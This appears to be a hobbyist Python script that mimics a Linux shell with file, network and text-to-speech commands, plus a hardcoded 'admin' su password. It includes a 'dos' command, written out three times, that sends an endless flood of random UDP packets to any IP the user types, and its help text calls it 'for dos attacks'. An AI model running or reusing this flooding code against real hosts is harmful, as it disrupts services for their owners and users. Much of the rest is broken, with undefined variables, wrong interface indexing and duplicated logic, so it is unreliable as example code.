#!/usr/local/bin/python3.8
import py_compile
import click
from os.path import basename
import pyttsx3
import keyboard
import random
import socket
import zipfile
import pathlib
import shutil
import keyboard
import webview
import bs4
import time
import requests
import netifaces
import platform
import getpass
from pythonping import ping
import sys
import os
from termcolor import colored
import requests
import urllib
import wget
import tarfile
from tqdm import tqdm
import datetime
from shutil import get_terminal_size
#def clear():
   #sys.stderr.write("\x1b[2J\x1b[H")
#u"{}[2J{}[;H".format(chr(27), chr(27))
#keyboard.add_hotkey('ctrl+l', print,args=('\033[H\033[J'))
def nonroot():
	def hardware():
	    print('Platform architecture:', platform.architecture())
	    print(colored("Platform processor:"+platform.processor(),"green"))
	    print(colored('Machine type:'+platform.machine(),"green"))
	    print(colored('Systems network name:'+ platform.node(),"green"))
	    print(colored('Platform information:'+ platform.platform(),"green"))
	    print(colored('Platform processor:'+ platform.platform(),"green"))
	    print(colored('Operating system:'+ platform.system(),"green"))
	    print(colored('System info:'+ platform.system(),"green"))
	def dos():
	    print("""
	developer:dark wolf

	github:https://github.com/darkwlf

	developed after yesterday earthquick at tehran :/

	good luck!
	""")
	    #socket connect
	    ##############
	    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	    bytes = random._urandom(1490)
	    #############
	    #get ip and port from user
	    ip = a[4:]
	    ############
	    print (colored("[                    ] 0% ","green"))
	    time.sleep(1)
	    print (colored("[=====               ] 25%","red"))
	    time.sleep(1)
	    print (colored("[==========          ] 50%","green"))
	    time.sleep(1)
	    print (colored("[===============     ] 75%","blue"))
	    time.sleep(1)
	    print (colored("[====================] 100%","red"))
	    time.sleep(1)
	    sent = 0
	    while True:
                sock.sendto(bytes,(a[4:],80))
                sent = sent + 1
                print(colored("Sent "+str(sent)+" packets to "+a[4:],"green"))


	def compress(tar_file, members):
	    """
	    Adds files (`members`) to a tar_file and compress it
	    """
	    # open file for gzip compressed writing
	    tar = tarfile.open(tar_file, mode="w:gz")
	    # with progress bar
	    # set the progress bar
	    progress = tqdm(members)
	    for member in progress:
		# add file/folder/link to the tar file (compress)
                tar.add(member)
		# set the progress description of the progress bar
                progress.set_description(f"Compressing {member}")
	    # close the file
	    tar.close()
	def decompress(tar_file, path, members=None):
	    """
	    Extracts `tar_file` and puts the `members` to `path`.
	    If members is None, all members on `tar_file` will be extracted.
	    """
	    tar = tarfile.open(tar_file, mode="r:gz")
	    if members is None:
               members = tar.getmembers()
	    # with progress bar
	    # set the progress bar
	    progress = tqdm(members)
	    for member in progress:
               tar.extract(member, path=path)
		# set the progress description of the progress bar
               progress.set_description(f"Extracting {member.name}")
	    # or use this
	    # tar.extractall(members=members, path=path)
	    # close the file
	    tar.close()
	def dir():
	   a = os.listdir()
	   for i in a:
              print(colored(i+"\n\t","green"))
	def ip():
	   ip_request= requests.get("https://get.geojs.io/v1/ip.json")
	   my_ip = ip_request.json()['ip']
	   print("ip :"+my_ip)
	   url = 'https://get.geojs.io/v1/ip/geo/' +my_ip+".json"
	   geo_request = requests.get(url)
	   geo_result = geo_request.json()
	   print(geo_result)
	while True:
	   a = input(f"[{getpass.getuser()}@localhost {basename(os.getcwd())}]$ ")
	   if a.startswith("echo "):
	      print(a[5:])
	   elif a.startswith("cd "):
	      os.chdir(a[3:])
	   elif a == "ls":
	      dir()
	   elif a.startswith("ls "):
	      b = a[3:]
	      c = os.listdir(b)
	      for i in c:
                 print(colored(i+"\n","green"))
	   elif a == "time":
	      print(colored(datetime.datetime.now(),"blue"))
	   elif a.startswith("cat "):
	      file = open(a[4:],"r")
	      print(file.read())
	      file.close()
	   elif a.startswith("wget "):
	      url = a[5:]
	      filename = wget.download(url)
	      progress = tqdm(filename)
	      for member in progress:
                 progress.set_description(f"downloading {url}")
	      print("file is downloading")
	   elif a == "clear":
	      click.clear()
	   elif a.startswith("rm "):
	      s = a[3:]
	      os.remove(s)
	      print("file removed")
	   elif a.startswith("rmdir "):
	      os.rmdir(a[6:])
	      print("directory removed!")
	   elif a.startswith("compile "):
	      py_compile.compile(a[8:])
	      print("file compiled successfully!")
	   elif a == "hardware":
	      hardware()
	   elif a.startswith("pwd"):
	      print(os.getcwd())
	   elif a == "whoami":
	      print(getpass.getuser())
	   elif a.startswith("python"):
	      os.system("python3.8")
	   elif a == "myip":
	      ip()
	   elif a.startswith("ping "):
	      ping(a[5:],verbose=True,count=99999)
	   elif a.startswith("say "):
	      b = a[4:]
	      s = pyttsx3.init()
	      s.setProperty('rate',110)
	      s.say(b)
	      s.runAndWait()
	   elif a.startswith("dos "):
	      dos()
	   elif a.startswith("ifconfig"):
	      ip = netifaces.interfaces()
	      b = netifaces.ifaddresses(ip[0])
	      c = netifaces.ifaddresses(ip[2])
	      d = netifaces.ifaddresses(ip[3])
	      e = netifaces.ifaddresses(ip[4])
	      print(ip[1]+":","\n\n",netifaces.ifaddresses(ip[0]))
	      print(ip[2]+":","\n\n",netifaces.ifaddresses(ip[2]))
	      print(ip[3]+":","\n\n",netifaces.ifaddresses(ip[3]))
	      print(ip[4]+":","\n\n",netifaces.ifaddresses(ip[4]))
	   elif a.startswith("whois "):
	      inp = a[6:]
	      print("querying target => ",inp)
	      time.sleep(1)
	      req = requests.get("https://www.whois.com/whois/"+inp)
	      t = bs4.BeautifulSoup(req.text,"html.parser")
	      a = t.find_all('pre')
	      for i in a:
                 print(i.text+"\n")
	   elif a.startswith("webview "):
	      webview.create_window(title, a[7:])
	      webview.start()
	   elif a.startswith("remove "):
	      shutil.rmtree(a[7:])
	      print("file deleted succesfully!")
	   elif a.startswith("zip "):
	      c = a[4:]
	      compress(c+".tar.gz", [c])
	      print(colored("file "+c+" created successfully!\nfor add files into "+c+" file type this command zip "+c,"green"))
	   elif a.startswith("unzip "):
	      d = a[6:]
	      decompress(d, "extracted")
	      print(colored("file extracted successfully!","green"))
	   elif a.startswith("mkdir "):
	      os.mkdir(a[6:])
	      print(colored("file has created","green"))
	   elif a.startswith("cp "):
	      src = a[3:]
	      des = input("enter a destination path to copy:")
	      cp = shutil.copyfile(src,des)
	      print(colored("file "+src+" has copied to "+des +" successfully!","green"))
	      shutil.copytree(src, des)
	   elif a.startswith("mv "):
	      src = a[3:]
	      des = input("enter a destination path to move:")
	      dest = shutil.move(source, destination)
	      print(colored("file "+src+ "moved successfully to "+des,"green"))
	   elif a.startswith("rename "):
	      inp = a[7:]
	      inp2 = input("enter a file new name :")
	      os.rename(inp,inp2)
	      print(colored("file "+inp+" successfully renamed to "+inp2,"green"))
	   elif a == "su":
              pass
	   elif a == "exit":
		   exit()
	   elif a == "help":
	      print(colored("""


	echo command:



	the echo is for printing something on your terminal like:echo a
	 output:a


	cd command:

	is siwtch between directorys

	   like :cd /home


	ls command:

	   is show the files on your directory or the frist argument directory

	   like:ls /home

	   this is showing the /home directory files and folders



	exit command:
	   for exit of shell



	help:
	   show you how to use shell


	clear command:
	   for clear terminal screen and last texts

	say command:
	   say <word>
	   its text to speech command and thats say what you give it in argument

	cat command:
	   show a containg data on argument file
	   like:cat a
	   its show the a file data



	remove command:
	   for remove a directory
	   like : remove a
	   its remove a directory



	rmdir command:
	   its remove a empty directory
	   like: rmdir a
	   then if a directory was empty you can remove it by rmdir command


	rm command:
	   its for deleting a file
	   like : rm a
	   its remove a file if its been a directory



	ifconfig command:
	   its show your network cards



	webview command:
	   its show the webview of a url with python
	   like : webview https://google.com
	   it is show the webview of https://google.com



	ping command:
	   its ping of a ip or website
	   like : ping 8.8.8.8
	   it is ping 8.8.8.8 unlimited
	   for stop it press ctrl+c


	zip command:
	  its compress a files or folder
	  like:zip a
	  it is compress a



	unzip command:
	  it is decompress a file
	  like : unzip a
	  it is decompress a file and put in on "extracted" directory


	rename command:
	   it is rename a file or directory
	   note: this command dont need any arguments



	cp command:
	   it is copy a file or directory to another directory



	mv command:
	   it is move a file or directory to another directory



	whoami command:
	   its show your username



	wget command:
	   it is download a content of a url
	   like : wget https://google.com
	   this is save html of google.com




	su command:
	   it is root your user




	myip:
	  it is show your public ip

	dos command:
	   for dos attacks


	hardware command:
	   for show hardware information

	time command:
	   it is show the current time



	<for exit of a shell type exit and press enter or press ctrl+c>




	""","green"))
	else:
          print(colored('error:command '+colored(a,'red')+' not found!','green'))
def su():
	def hardware():
	    print('Platform architecture:', platform.architecture())
	    print(colored("Platform processor:"+platform.processor(),"green"))
	    print(colored('Machine type:'+platform.machine(),"green"))
	    print(colored('Systems network name:'+ platform.node(),"green"))
	    print(colored('Platform information:'+ platform.platform(),"green"))
	    print(colored('Platform processor:'+ platform.platform(),"green"))
	    print(colored('Operating system:'+ platform.system(),"green"))
	    print(colored('System info:'+ platform.system(),"green"))
	def dos():
	    print("""
	developer:dark wolf

	github:https://github.com/darkwlf

	developed after yesterday earthquick at tehran :/

	good luck!
	""")
	    #socket connect
	    ##############
	    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	    bytes = random._urandom(1490)
	    #############
	    #get ip and port from user
	    ip = a[4:]
	    ############
	    print (colored("[                    ] 0% ","green"))
	    time.sleep(1)
	    print (colored("[=====               ] 25%","red"))
	    time.sleep(1)
	    print (colored("[==========          ] 50%","green"))
	    time.sleep(1)
	    print (colored("[===============     ] 75%","blue"))
	    time.sleep(1)
	    print (colored("[====================] 100%","red"))
	    time.sleep(1)
	    sent = 0
	    while True:
                sock.sendto(bytes,(a[4:],80))
                sent = sent + 1
                print(colored("Sent "+str(sent)+" packets to "+a[4:],"green"))


	def compress(tar_file, members):
	    """
	    Adds files (`members`) to a tar_file and compress it
	    """
	    # open file for gzip compressed writing
	    tar = tarfile.open(tar_file, mode="w:gz")
	    # with progress bar
	    # set the progress bar
	    progress = tqdm(members)
	    for member in progress:
		# add file/folder/link to the tar file (compress)
                tar.add(member)
		# set the progress description of the progress bar
                progress.set_description(f"Compressing {member}")
	    # close the file
	    tar.close()
	def decompress(tar_file, path, members=None):
	    """
	    Extracts `tar_file` and puts the `members` to `path`.
	    If members is None, all members on `tar_file` will be extracted.
	    """
	    tar = tarfile.open(tar_file, mode="r:gz")
	    if members is None:
               members = tar.getmembers()
	    # with progress bar
	    # set the progress bar
	    progress = tqdm(members)
	    for member in progress:
               tar.extract(member, path=path)
		# set the progress description of the progress bar
               progress.set_description(f"Extracting {member.name}")
	    # or use this
	    # tar.extractall(members=members, path=path)
	    # close the file
	    tar.close()
	def dir():
	   a = os.listdir()
	   for i in a:
              print(colored(i+"\n\t","green"))
	def ip():
	   ip_request= requests.get("https://get.geojs.io/v1/ip.json")
	   my_ip = ip_request.json()['ip']
	   print("ip :"+my_ip)
	   url = 'https://get.geojs.io/v1/ip/geo/' +my_ip+".json"
	   geo_request = requests.get(url)
	   geo_result = geo_request.json()
	   print(geo_result)
	while True:
	   a = input(f"[root@localhost {basename(os.getcwd())}]# ")
	   if a.startswith("echo "):
	      print(a[5:])
	   elif a.startswith("cd "):
	      os.chdir(a[3:])
	   elif a == "ls":
	      dir()
	   elif a.startswith("ls "):
	      b = a[3:]
	      c = os.listdir(b)
	      for i in c:
                 print(colored(i+"\n","green"))
	   elif a == "time":
	      print(colored(datetime.datetime.now(),"blue"))
	   elif a.startswith("cat "):
	      file = open(a[4:],"r")
	      print(file.read())
	      file.close()
	   elif a.startswith("wget "):
	      url = a[5:]
	      filename = wget.download(url)
	      progress = tqdm(filename)
	      for member in progress:
                 progress.set_description(f"downloading {url}")
	      print("file is downloading")
	   elif a == "clear":
	      click.clear()
	   elif a.startswith("rm "):
	      s = a[3:]
	      os.remove(s)
	      print("file removed")
	   elif a.startswith("rmdir "):
	      os.rmdir(a[6:])
	      print("directory removed!")
	   elif a.startswith("compile "):
	      py_compile.compile(a[8:])
	      print("file compiled successfully!")
	   elif a == "hardware":
	      hardware()
	   elif a.startswith("pwd"):
	      print(os.getcwd())
	   elif a == "whoami":
	      print(getpass.getuser())
	   elif a.startswith("python"):
	      os.system("python3.8")
	   elif a == "myip":
	      ip()
	   elif a.startswith("ping "):
	      ping(a[5:],verbose=True,count=99999)
	   elif a.startswith("say "):
	      b = a[4:]
	      s = pyttsx3.init()
	      s.setProperty('rate',110)
	      s.say(b)
	      s.runAndWait()
	   elif a.startswith("dos "):
	      dos()
	   elif a.startswith("ifconfig"):
	      ip = netifaces.interfaces()
	      b = netifaces.ifaddresses(ip[0])
	      c = netifaces.ifaddresses(ip[2])
	      d = netifaces.ifaddresses(ip[3])
	      e = netifaces.ifaddresses(ip[4])
	      print(ip[1]+":","\n\n",netifaces.ifaddresses(ip[0]))
	      print(ip[2]+":","\n\n",netifaces.ifaddresses(ip[2]))
	      print(ip[3]+":","\n\n",netifaces.ifaddresses(ip[3]))
	      print(ip[4]+":","\n\n",netifaces.ifaddresses(ip[4]))
	   elif a.startswith("whois "):
	      inp = a[6:]
	      print("querying target => ",inp)
	      time.sleep(1)
	      req = requests.get("https://www.whois.com/whois/"+inp)
	      t = bs4.BeautifulSoup(req.text,"html.parser")
	      a = t.find_all('pre')
	      for i in a:
                 print(i.text+"\n")
	   elif a.startswith("webview "):
	      webview.create_window(title, a[7:])
	      webview.start()
	   elif a.startswith("remove "):
	      shutil.rmtree(a[7:])
	      print("file deleted succesfully!")
	   elif a.startswith("zip "):
	      c = a[4:]
	      compress(c+".tar.gz", [c])
	      print(colored("file "+c+" created successfully!\nfor add files into "+c+" file type this command zip "+c,"green"))
	   elif a.startswith("unzip "):
	      d = a[6:]
	      decompress(d, "extracted")
	      print(colored("file extracted successfully!","green"))
	   elif a.startswith("mkdir "):
	      os.mkdir(a[6:])
	      print(colored("file has created","green"))
	   elif a.startswith("cp "):
	      src = a[3:]
	      des = input("enter a destination path to copy:")
	      cp = shutil.copyfile(src,des)
	      print(colored("file "+src+" has copied to "+des +" successfully!","green"))
	      shutil.copytree(src, des)
	   elif a.startswith("mv "):
	      src = a[3:]
	      des = input("enter a destination path to move:")
	      dest = shutil.move(source, destination)
	      print(colored("file "+src+ "moved successfully to "+des,"green"))
	   elif a.startswith("rename "):
	      inp = a[7:]
	      inp2 = input("enter a file new name :")
	      os.rename(inp,inp2)
	      print(colored("file "+inp+" successfully renamed to "+inp2,"green"))
	   elif a == "su":
              nonroot()
	   elif a == "exit":
	      nonroot()
	   elif a == "help":
	      print(colored("""


	echo command:



	the echo is for printing something on your terminal like:echo a
	 output:a


	cd command:

	is siwtch between directorys

	   like :cd /home


	ls command:

	   is show the files on your directory or the frist argument directory

	   like:ls /home

	   this is showing the /home directory files and folders



	exit command:
	   for exit of shell



	help:
	   show you how to use shell


	clear command:
	   for clear terminal screen and last texts

	say command:
	   say <word>
	   its text to speech command and thats say what you give it in argument

	cat command:
	   show a containg data on argument file
	   like:cat a
	   its show the a file data



	remove command:
	   for remove a directory
	   like : remove a
	   its remove a directory



	rmdir command:
	   its remove a empty directory
	   like: rmdir a
	   then if a directory was empty you can remove it by rmdir command


	rm command:
	   its for deleting a file
	   like : rm a
	   its remove a file if its been a directory



	ifconfig command:
	   its show your network cards



	webview command:
	   its show the webview of a url with python
	   like : webview https://google.com
	   it is show the webview of https://google.com



	ping command:
	   its ping of a ip or website
	   like : ping 8.8.8.8
	   it is ping 8.8.8.8 unlimited
	   for stop it press ctrl+c


	zip command:
	  its compress a files or folder
	  like:zip a
	  it is compress a



	unzip command:
	  it is decompress a file
	  like : unzip a
	  it is decompress a file and put in on "extracted" directory


	rename command:
	   it is rename a file or directory
	   note: this command dont need any arguments



	cp command:
	   it is copy a file or directory to another directory



	mv command:
	   it is move a file or directory to another directory



	whoami command:
	   its show your username



	wget command:
	   it is download a content of a url
	   like : wget https://google.com
	   this is save html of google.com




	su command:
	   it is root your user




	myip:
	  it is show your public ip

	dos command:
	   for dos attacks


	hardware command:
	   for show hardware information

	time command:
	   it is show the current time



	<for exit of a shell type exit and press enter or press ctrl+c>




	""","green"))
         #else:
            #print(colored("error:command "+colored(a,"red")+colored(" not found!","green"),"green"))

def hardware():
    print('Platform architecture:', platform.architecture())
    print(colored("Platform processor:"+platform.processor(),"green"))
    print(colored('Machine type:'+platform.machine(),"green"))
    print(colored('Systems network name:'+ platform.node(),"green"))
    print(colored('Platform information:'+ platform.platform(),"green"))
    print(colored('Platform processor:'+ platform.platform(),"green"))
    print(colored('Operating system:'+ platform.system(),"green"))
    print(colored('System info:'+ platform.system(),"green"))
def dos():
    print("""
developer:dark wolf

github:https://github.com/darkwlf

developed after yesterday earthquick at tehran :/

good luck!
""")
    #socket connect
    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############
    #get ip and port from user
    ip = a[4:]
    ############
    print (colored("[                    ] 0% ","green"))
    time.sleep(1)
    print (colored("[=====               ] 25%","red"))
    time.sleep(1)
    print (colored("[==========          ] 50%","green"))
    time.sleep(1)
    print (colored("[===============     ] 75%","blue"))
    time.sleep(1)
    print (colored("[====================] 100%","red"))
    time.sleep(1)
    sent = 0
    while True:
        #send packets
        sock.sendto(bytes,(a[4:],80))
        sent = sent + 1
        print(colored("Sent "+str(sent)+" packets to "+a[4:],"green"))


def compress(tar_file, members):
    """
    Adds files (`members`) to a tar_file and compress it
    """
    # open file for gzip compressed writing
    tar = tarfile.open(tar_file, mode="w:gz")
    # with progress bar
    # set the progress bar
    progress = tqdm(members)
    for member in progress:
        # add file/folder/link to the tar file (compress)
        tar.add(member)
        # set the progress description of the progress bar
        progress.set_description(f"Compressing {member}")
    # close the file
    tar.close()
def decompress(tar_file, path, members=None):
    """
    Extracts `tar_file` and puts the `members` to `path`.
    If members is None, all members on `tar_file` will be extracted.
    """
    tar = tarfile.open(tar_file, mode="r:gz")
    if members is None:
        members = tar.getmembers()
    # with progress bar
    # set the progress bar
    progress = tqdm(members)
    for member in progress:
        tar.extract(member, path=path)
        # set the progress description of the progress bar
        progress.set_description(f"Extracting {member.name}")
    # or use this
    # tar.extractall(members=members, path=path)
    # close the file
    tar.close()
def dir():
   a = os.listdir()
   for i in a:
      print(colored(i+"\n\t","green"))
def ip():
   ip_request= requests.get("https://get.geojs.io/v1/ip.json")
   my_ip = ip_request.json()['ip']
   print("ip :"+my_ip)
   url = 'https://get.geojs.io/v1/ip/geo/' +my_ip+".json"
   geo_request = requests.get(url)
   geo_result = geo_request.json()
   print(geo_result)
while True:
   a = input(f"[{getpass.getuser()}@localhost {basename(os.getcwd())}]$ ")
   if a.startswith("echo "):
      print(a[5:])
   elif a.startswith("cd "):
      os.chdir(a[3:])
   elif a == "ls":
      dir()
   elif a.startswith("ls "):
      b = a[3:]
      c = os.listdir(b)
      for i in c:
         print(colored(i+"\n","green"))
   elif a == "time":
      print(colored(datetime.datetime.now(),"blue"))
   elif a.startswith("cat "):
      file = open(a[4:],"r")
      print(file.read())
      file.close()
   elif a.startswith("wget "):
      url = a[5:]
      filename = wget.download(url)
      progress = tqdm(filename)
      for member in progress:
        progress.set_description(f"downloading {url}")
      print("file is downloading")
   elif a == "clear":
      click.clear()
   elif a.startswith("rm "):
      s = a[3:]
      os.remove(s)
      print("file removed")
   elif a.startswith("rmdir "):
      os.rmdir(a[6:])
      print("directory removed!")
   elif a.startswith("compile "):
      py_compile.compile(a[8:])
      print("file compiled successfully!")
   elif a == "hardware":
      hardware()
   elif a.startswith("pwd"):
      print(os.getcwd())
   elif a == "whoami":
      print(getpass.getuser())
   elif a.startswith("python"):
      os.system("python3.8")
   elif a == "myip":
      ip()
   elif a.startswith("ping "):
      ping(a[5:],verbose=True,count=99999)
   elif a.startswith("say "):
      b = a[4:]
      s = pyttsx3.init()
      s.setProperty('rate',110)
      s.say(b)
      s.runAndWait()
   elif a.startswith("dos "):
      dos()
   elif a.startswith("ifconfig"):
      ip = netifaces.interfaces()
      b = netifaces.ifaddresses(ip[0])
      c = netifaces.ifaddresses(ip[2])
      d = netifaces.ifaddresses(ip[3])
      e = netifaces.ifaddresses(ip[4])
      print(ip[1]+":","\n\n",netifaces.ifaddresses(ip[0]))
      print(ip[2]+":","\n\n",netifaces.ifaddresses(ip[2]))
      print(ip[3]+":","\n\n",netifaces.ifaddresses(ip[3]))
      print(ip[4]+":","\n\n",netifaces.ifaddresses(ip[4]))
   elif a.startswith("whois "):
      inp = a[6:]
      print("querying target => ",inp)
      time.sleep(1)
      req = requests.get("https://www.whois.com/whois/"+inp)
      t = bs4.BeautifulSoup(req.text,"html.parser")
      a = t.find_all('pre')
      for i in a:
         print(i.text+"\n")
   elif a.startswith("webview "):
      webview.create_window(title, a[7:])
      webview.start()
   elif a.startswith("remove "):
      shutil.rmtree(a[7:])
      print("file deleted succesfully!")
   elif a.startswith("zip "):
      c = a[4:]
      compress(c+".tar.gz", [c])
      print(colored("file "+c+" created successfully!\nfor add files into "+c+" file type this command zip "+c,"green"))
   elif a.startswith("unzip "):
      d = a[6:]
      decompress(d, "extracted")
      print(colored("file extracted successfully!","green"))
   elif a.startswith("mkdir "):
      os.mkdir(a[6:])
      print(colored("file has created","green"))
   elif a.startswith("cp "):
      src = a[3:]
      des = input("enter a destination path to copy:")
      cp = shutil.copyfile(src,des)
      print(colored("file "+src+" has copied to "+des +" successfully!","green"))
      shutil.copytree(src, des)
   elif a.startswith("mv "):
      src = a[3:]
      des = input("enter a destination path to move:")
      dest = shutil.move(source, destination)
      print(colored("file "+src+ "moved successfully to "+des,"green"))
   elif a.startswith("rename "):
      inp = a[7:]
      inp2 = input("enter a file new name :")
      os.rename(inp,inp2)
      print(colored("file "+inp+" successfully renamed to "+inp2,"green"))
   elif a == "su":
      password = 'admin'
      b = input('Password:')
      if b == password:
         while True:
            su()
      else:
         print('Login error!')
   elif a == "exit":
      print("exited successfully!")
      break
      exit()
   elif a == "help":
      print(colored("""


echo command:



the echo is for printing something on your terminal like:echo a
 output:a


cd command:

is siwtch between directorys

   like :cd /home


ls command:

   is show the files on your directory or the frist argument directory

   like:ls /home

   this is showing the /home directory files and folders



exit command:
   for exit of shell



help:
   show you how to use shell


clear command:
   for clear terminal screen and last texts

say command:
   say <word>
   its text to speech command and thats say what you give it in argument

cat command:
   show a containg data on argument file
   like:cat a
   its show the a file data



remove command:
   for remove a directory
   like : remove a
   its remove a directory



rmdir command:
   its remove a empty directory
   like: rmdir a
   then if a directory was empty you can remove it by rmdir command


rm command:
   its for deleting a file
   like : rm a
   its remove a file if its been a directory



ifconfig command:
   its show your network cards



webview command:
   its show the webview of a url with python
   like : webview https://google.com
   it is show the webview of https://google.com



ping command:
   its ping of a ip or website
   like : ping 8.8.8.8
   it is ping 8.8.8.8 unlimited
   for stop it press ctrl+c


zip command:
  its compress a files or folder
  like:zip a
  it is compress a



unzip command:
  it is decompress a file
  like : unzip a
  it is decompress a file and put in on "extracted" directory


rename command:
   it is rename a file or directory
   note: this command dont need any arguments



cp command:
   it is copy a file or directory to another directory



mv command:
   it is move a file or directory to another directory



whoami command:
   its show your username



wget command:
   it is download a content of a url
   like : wget https://google.com
   this is save html of google.com




su command:
   it is root your user




myip:
  it is show your public ip

dos command:
   for dos attacks


hardware command:
   for show hardware information

time command:
   it is show the current time



<for exit of a shell type exit and press enter or press ctrl+c>




""","green"))
   else:
      print(colored("command "+colored(a,"red")+colored(" not found!","green"),"green"))
